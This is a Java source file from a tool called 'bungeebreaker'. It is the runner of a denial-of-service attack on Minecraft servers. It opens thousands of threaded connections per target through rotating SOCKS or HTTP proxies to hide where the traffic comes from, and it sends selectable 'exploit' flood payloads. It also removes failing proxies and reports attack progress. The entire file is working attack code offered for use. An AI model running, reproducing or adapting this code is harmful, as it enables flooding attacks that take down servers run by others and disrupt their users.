package me.nzxter.bungeebreaker.flood;

import java.io.DataOutputStream;
import java.lang.reflect.Method;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.Proxy.Type;
import java.net.Socket;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import me.nzxter.bungeebreaker.flood.Flooders.Flooder;
import me.nzxter.bungeebreaker.helper.ConsoleCoders;
import me.nzxter.bungeebreaker.helper.PingHelper;
import me.nzxter.bungeebreaker.helper.SRVResolver;
import me.nzxter.bungeebreaker.network.SocketHttp;
import me.nzxter.bungeebreaker.option.Options;
import me.nzxter.bungeebreaker.proxy.Proxies;

public class FloodRunner {

  private final Options options;
  private final Proxies proxies;

  public FloodRunner(Options options, Proxies proxies) {
    this.options = options;
    this.proxies = proxies;
  }

  private int connections = 0, failed = 0, timed = 0;
  private int maxConnections = -1;

  private final Flooders flooders = new Flooders();

  public void run() {
    String host = this.options.getOption("host", "127.0.0.1");
    int port = this.options.getOption("port", 25565);

    final boolean srvResolve = this.options.getOption("srvResolve", true);
    final boolean alwaysResolve = this.options.getOption("alwaysResolve", false);

    final int threads = this.options.getOption("threads", 1000);
    final int connections = this.options.getOption("connections", 1000);
    final int attackTime = this.options.getOption("attackTime", 30);

    final boolean srvResolve2 = this.options.getOption("srvResolve2", false);

    final int timeout = this.options.getOption("timeout", 0);

    final boolean keepAlive = this.options.getOption("keepAlive", true);

    final String floodName = String.valueOf(this.options.getOption("exploit", "1"));

    final boolean removeFailure = this.options.getOption("removeFailure", false);

    Flooders.LOOP_AMOUNT = this.options.getOption("loopAmount", 1500);

    final boolean print = this.options.getOption("print", false),
        socksV4 = this.options.getOption("socksV4", true);

    if (srvResolve && alwaysResolve) {
      System.out.println(
          "ServerResolver and AlwaysResolve options are enabled at the same time, are you sure it's fine?");
    }

    if (srvResolve) {
      final String resolvedIp = SRVResolver.srv(host);
      final String[] resolvedSplit = resolvedIp.split(":");
      host = resolvedSplit[0];
      port = Integer.parseInt(resolvedSplit[1]);
    }

    //PingHelper.testPing(new InetSocketAddress(host, port), host, port);

    final Flooder flooder = this.flooders.findById(String.valueOf(floodName));
    if (flooder == null) {
      System.out.println(
          "Flooder with name " + floodName + " doesnt exist! List of floods: " + this.flooders
              .getFlooders().toString());
      System.exit(1);
      return;
    }
    if (srvResolve2) {
      try {
        String latest = "unkown";
        //InetAddress address = InetAddress.getByName(host);
        for (InetAddress resolved : InetAddress.getAllByName(host)) {
          try {
            final Socket socket = new Socket();
            socket.connect(new InetSocketAddress(latest = resolved.getHostAddress(), port), 1000);

            socket.getOutputStream().write(0);
          } catch (Exception ex) {
            System.out.println("[SrvResolve2] Found ip, " + (resolved.getHostAddress())
                + ", but couldn't connect = (");
            continue;
          }

          System.out.println("[SrvResolve2] Found ip! " + (resolved.getHostAddress()));
        }
        System.out.println("[SrvResolve2] Resolved ip! Using: " + (host = latest));
      } catch (Exception ex) {
        System.out.println("[SrvResolve2] Couldn't resolve ip! " + ex.getMessage());
      }
    }

    new Timer().scheduleAtFixedRate(new TimerTask() {
      @Override
      public void run() {
        System.out.println(
            "Successfully connected sockets: " + ConsoleCoders.ANSI_GREEN +
                +FloodRunner.this.connections + ConsoleCoders.ANSI_RESET + "/" + maxConnections
                + "\nFailed: " + FloodRunner.this.failed + ", timed: " + ConsoleCoders.ANSI_RED
                + timed + ConsoleCoders.ANSI_RESET + ", proxies: " + proxies.size());
      }
    }, 1000L * 8, 1000L * 8);

    new Thread(() -> {
      try {
        Thread.sleep(1000L * attackTime);
      } catch (Exception ignored) {
      }
      System.out.println("Attack finished.");
      System.exit(-1);
    }).start();

    final ExecutorService executorService = Executors.newFixedThreadPool(threads);

    System.out.println("Started attack! " + host + ":" + port + ", method: "
        + ConsoleCoders.ANSI_BLUE + floodName + ConsoleCoders.ANSI_RESET + ","
        + " threads: " + threads + ", time attack: " + attackTime);
    this.maxConnections = threads * connections;

    String finalServerName = host;
    int finalPort = port;
    for (int j = 0; j < threads; j++) {

      executorService.submit(() -> {
        //System.out.println("to dziala xd");
        try {
          final String newServerName;
          final int newServerPort;
          if (alwaysResolve) {
            final String resolvedIp = SRVResolver.srv(finalServerName);
            final String[] resolvedSplit = resolvedIp.split(":");
            newServerName = resolvedSplit[0];
            newServerPort = Integer.parseInt(resolvedSplit[1]);
          } else {
            newServerName = finalServerName;
            newServerPort = finalPort;
          }

          Proxy lastProxy = null;
          for (int i = 0; i < connections; i++) {

            try {

              final Proxy proxy = lastProxy = this.proxies.nextProxy();
              final Socket socket = proxy.type() == Type.HTTP
                  ? new SocketHttp(newServerName, newServerPort, proxy.address(), timeout)
                  : new Socket(proxy);

              if (!(socket instanceof SocketHttp)) {
                if (socksV4) {
                  try {
                    Method m = socket.getClass()
                        .getDeclaredMethod("getImpl", (Class<?>[]) new Class[0]);
                    m.setAccessible(true);
                    final Object sd = m.invoke(socket, new Object[0]);
                    m = sd.getClass().getDeclaredMethod("setV4", (Class<?>[]) new Class[0]);
                    m.setAccessible(true);
                    m.invoke(sd, new Object[0]);
                  } catch (Exception ignored) {
                  }
                }

                socket.connect(new InetSocketAddress(newServerName, newServerPort), timeout);
              }

              DataOutputStream out = new DataOutputStream(socket.getOutputStream());
              flooder.flood(out, newServerName, newServerPort);
              out.flush();

              this.connections++;
              if (print) {
                System.out.println(
                    "CONNECTED " + ConsoleCoders.ANSI_RED + newServerName + ":" + newServerPort
                        + ConsoleCoders.ANSI_RESET + " | " + ConsoleCoders.ANSI_CYAN + proxy
                        .address().toString() + ConsoleCoders.ANSI_RESET + " x" + this.connections);
              }

              if (!keepAlive) {
                socket.close();
              }
            } catch (Exception ex) {
              this.failed++;

              //System.out.println(ex.getMessage() + " | " + ex.getClass().getSimpleName());
              if (ex.getMessage().contains("reply")) {
                this.timed++;

                if (removeFailure)
                  this.proxies.removeProxy(lastProxy);
              }
            }
          }
        } catch (Exception ignored) {
        }
      });
    }
  }

}
